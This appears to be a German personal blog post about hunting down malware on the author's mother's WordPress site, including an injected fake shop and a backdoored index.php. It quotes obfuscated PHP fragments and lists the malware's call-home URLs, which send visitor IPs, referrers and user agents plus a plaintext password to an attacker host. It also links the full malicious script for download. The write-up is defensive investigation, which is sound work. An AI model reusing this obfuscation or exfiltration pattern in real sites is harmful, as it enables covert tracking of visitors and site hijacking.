---
title: "Wordpress Hack"
date: "2021-08-01T19:30:00+02:00"
draft: false
author: "Marius Timmer"
keywords: ["Wordpress", "Hack", "Angriff", "Fakeshop", "Hetzner", "PHP"]
tags: ["Technik"]
description: "Die WordPress-Seite meiner Mutter wurde gehackt und ich mache mich auf die Spurensuche"
summary: "Da meine Mutter selbstständig ist, hat sie natürlich auch eine eigene Webseite, die im Mittelpunkt ihrer Arbeit steht. Nun hat sich aber irgendwer, oder irgendetwas darauf eingenistet und geht nicht mehr so einfach weg."
---

Hin und wieder helfe ich einigen Leuten in meinem Umfeld beim Aufsetzen
und Warten ihrer Internetseiten. So gucke ich immer wieder mal über
die WordPress-Installation meiner Mutter und stelle sicher, dass sie
auch ja alle Updates installiert hat. Einigen von euch stellen sich
die Nackenhaare beim Namen Wordpress wahrscheinlich schon auf (_so
geht es mir auch immer wieder_), aber am Ende bin ich da nur
die ausführende Kraft. Um das einmal klarzustellen: WordPress
ist ein einziges Sicherheitsrisiko. Das verwundert natürlich nicht,
wenn man bedenkt, wie weit verbreitet die Software ist. Sieht man
aber einmal in den Code erkennt man, dass es bei der Entwicklung
kein wirkliches Konzept gegeben hat oder es maximal versucht wurde
nachträglich einzubauen. Da es sich aber mit seinen ganzen Erweiterungen
um ein Gemeinschafts-Projekt handelt, ist es natürlich auch gar nicht
so einfach, einheitlichen und guten Code zu schreiben. Abe rich wäre
ja schon zufrieden, wenn die Datenbank-Verbindung nicht in einer globalen
Variabel von überall aufzurufen wäre.

Der Fake-Shop
-------------
Anfang des Jahres meldete sich dann meine Mutter bei mir, da sich jemand
bei ihr erkundigt hatte, wie der Status einer bestimmten Bestellung sei.
Er habe ein Ersatzteil für seine Modell-Eisenbahn bestellt, bisher aber
noch keine Reaktion erhalten. An dieser Stelle ist zu erwähnen, dass
meine Mutter keinen Shop führt, sondern Fortbildungen anbietet.

Sehr schnell meldete sie sich also bei mir und bat mich um Hilfe.
In der Tat war da ein Shop auf ihrer Seite, den keiner da hin gespielt
hatte. Er sah auch wirklich nicht gut aus, da einzelne Fragmente
(_Bilder, Preise, Beschreibungen_) einfach in die schon existierende
Seite meiner Mutter eingebettet wurden. Wer darauf rein fällt, bettelt
förmlich auch darum. Allerdings ist das natürlich dennoch ein großes
Problem. Schließlich ist da ein Shop von irgendwelchen Betrügern auf
der Seite meiner Mutter, die somit auch dafür (_juristisch_) verantwortlich
ist.

Ich fand heraus, welche Dateien betroffen waren. Es existierte ein
Verzeichnis (_`designthemes`_), welches ich einfach löschen musste.
Zudem wurde die `.htaccess`-Datei modifiziert, sodass Gäste auf
die Seiten im besagten Verzeichnis geleitet wurden. Der Säuberungsprozess
selbst ging also recht schnell. Einen Tag später wurde ich aber wieder
informiert, dass der Shop zurück sei. Das wunderte mich tatsächlich,
beantwortete mir aber die Frage aller Fragen: Wie ist der Shop da
hingekommen?

Die erste Reaktion bei solchen "_Einbrüchen_" ist natürlich erst einmal
der Austausch sämtlicher Passwörter. Um so erstaunter war ich dann aber,
als ich hörte, dass der Shop zurück sei. Ich schloss somit nun aber aus,
dass jemand die FTP-Zugangsdaten herausgefunden hat und sah mir die
WordPress-Installation meiner Mutter noch einmal näher an. Tatsächlich
fand ich ein kompromitiertes PHP-Skript und ein als gif-Datei getarntes
Skript, welche beim Aufruf durch Nutzer immer wieder angestoßen wurde
und unter Anderem den Shop wieder holte.

Bisher hatte ich noch nicht die Zeit gefunden, mir das Problem genaue
anzusehen. Wenn ich aber schon nicht die Ursache nicht so schnell finden
konnte, wollte ich zumindest die Symptome bekämpfen. Schließlich war
meine Mutter hier rechtlich angreifbar und auch ihre Google-Platzierung
litt natürlich darunter.

Was ich also machte, war ein kleines Skript zu schreiben, welches sich
alle 5 Minuten per FTP mit dem Server verbindet und prüft, ob das mysteriöse
Verzeichnis existiert. Wenn es gefunden wird, wird es direkt gelöscht und
die `.htaccess` wiederhergestellt. Das ist natürlich keine Dauerlösung,
aber die hereinzufallenden Besucher erhielten beim Klick auf die immer
weiter sinkenden Google-Ergebnisse nur noch <abbr title="Seite nicht
gefunden">404</abbr>-Seiten, womit das gröbste Problem schon einmal gelöst war.

Nun geht das schon einige Monate so, ich weiß aber noch immer nicht, wo
der Shop immer wieder her kommt. Die besagten beiden Skripte habe ich
mehrfach gelöscht und an anderen Stellen konnte ich keine Hinweise auf
weitere mysteriöse Dateien feststellen. Zumindest hatte ich einmal den
gesamten Dateibaum heruntergeladen und durchsucht. Daher werde ich mir
nun wohl den Code genauer ansehen. Ich sehe es als eine Art Schnitzeljagd
mit PHP-Code.

Die Subdomain
-------------
Seit letzter Woche betreibt meine Mutter eine weitere WordPress-Instanz
auf einer Subdomain. Von einem auf den anderen Tag war diese nicht mehr
zu erreichen. Daher bat sie mich wieder um Hilfe. Zwei Stunden lang sah
ich mir diverse Hetzner-Konfigurationen an und suchte den Grund, wieso
die Subdomain nicht lief. Viel zu spät bemerkte ich erst, dass die
Subdomain an sich funktionierte, allerdings gab das WordPress nur eine
leere Antwort zurück.

Zuerst verdächtigte ich sämtliche WordPress-Erweiterungen irgendeinen
Unfug zu treiben, zumal es eine Fehlermeldung in den Protokollen
bezüglich veralteter Funktionsaufrufe gab. Dann sah ich mir aber
_aus einer Laune heraus_ einfach mal die `index.php` an und sah,
dass sie ganz merkwürdig aussah. Ganz viel "_Security by obscurity_"
war da drin, was ich im Folgenden zeigen möchte.

Zuerst wird die Fehlerausgabe deaktiviert, weswegen meine Versuche mit der
Apache-Konfiguration Fehlermeldungen auszugeben alle scheiterten. Anschließend
werden merkwürdig benannte Strings definiert, die im Anschluss mit
verschiedenen Offsets ausgelesen werden, woraus sich z.B. auch der Hostname
des Control-Servers ergibt.
```php
//CX3_CX4
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
$OoooOO0 = 'czhnientytwoj';
$OOOOOO = "%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a";
$O = urldecode($OOOOOO);
```

Ganz grob lässt sich sagen, dass das Skript möglichst viele Informationen
sammelt und dann an den eigenen Server weiter gibt (_nach Hause telefoniert_):

 - Dokumenten-Root-Verzeichnis
 - Angefragte URL
 - Hostname
 - Sprache
 - User-Agent (_benutzter Browser_)
 - Referrer (_Von wo der Nutzer weiter geleitet wurde_)
 - Verschlüsselte Kommunikation oder nicht (_`HTTP`/`HTTPS`_)
 - Ggf. abweichendes Protokoll
 - IP des Nutzers

Diese Daten werden gesammelt und anschließend an `czhnientytwoj.fluux.xyz` übermittelt. Den Host-Betreiber der Domain habe ich bereits informiert und eine Antwort steht noch aus. Beim nach Hause telefonieren werden die gesammelten Daten zum einen übertragen, aber vor allem wird auch die "_<abbr title="Schnittstelle">API</abbr>_" des angreifers angesprochen. Dabei wird jedes mal ein Passwort übertragen, dass im Klartext vorhanden und gar nicht mal so gut ist. Es lautet nämlich `sl123`. Das ist aber höchst wahrscheintlich nicht schlimm, weil der Angreifer das sowieso nur nutzt, um genau diese Befehle auszuführen, die in diesem Skript getätigt werden. Bei jedem Besuch der Seite wird somit der Angreifer informiert, dass die Seite meiner Mutter noch online ist und jede Veränderung der übertragenen Daten fällt auch sofort auf.

Insgesamt werden die folgenden (_API-_)Aufrufe getätigt:

```php
/Api/siteAllMap.php?page=' . $rUrl . '&pwd=sl123&domain=' . $typeName
/Api/siteUrlApi.php?stype=sitemap&num=6000&pr=' . $pr . '&url=' . $rUrl . '&domain=' . $typeName . '&ip=' . $client_ip
/jump.php?domain=' . $sName . '&page=' . $rUrl . '&bot=0&pr=' . $pr . '&refer=' . $referer . '&ip=' . $client_ip . '&lg=' . $Ooolg
/918.php?domain=' . $sName . '&page=' . $rUrl . '&bot=1&pr=' . $pr . '&ip=' . $client_ip . '&lg=' . $Ooolg
/org.php?domain=' . $sName . '&page=' . $rUrl . '&pr=' . $pr . '&ip=' . $client_ip . '&lg=' . $Ooolg
```

Somit weiß ich auf jeden Fall, wo ich in den kommenden Tagen ansetzen
und meine Schnitzeljagd fortsetzen kann. Wenn ihr auch Interesse haben
solltet, eröffne ich hiermit die Jagd. Das PHP-Skript könnt ihr als
Text-Datei [hier](/attachments/index_hacked.txt) herunterladen.

Interessant finde ich auch, dass sich der _Angreifer_ nicht die Mühe
gemacht hat, die beiden Zeilen am Ende anzufügen, durch die Wordpress
aufgerufen wird. Wären diese beiden Zeilen dort, wäre der "_Hack_"
vermutlich nicht einmal aufgefallen.

Am Ende frage ich mich nun aber noch immer, wie die beiden Angriffe
funktionieren, damit ich das verhindern kann. esucher der Seite können
eigentlich nichts hochladen. Auch wenn auf der Seite sogar die Kommentarfunktion
ohne Captchas aktiviert war. Seit gestern ist das zumindest auch anders.
Aber ich bezweifle, dass der Angriff jedes mal über die Funktion kommt.
Es bleibt also spannend.
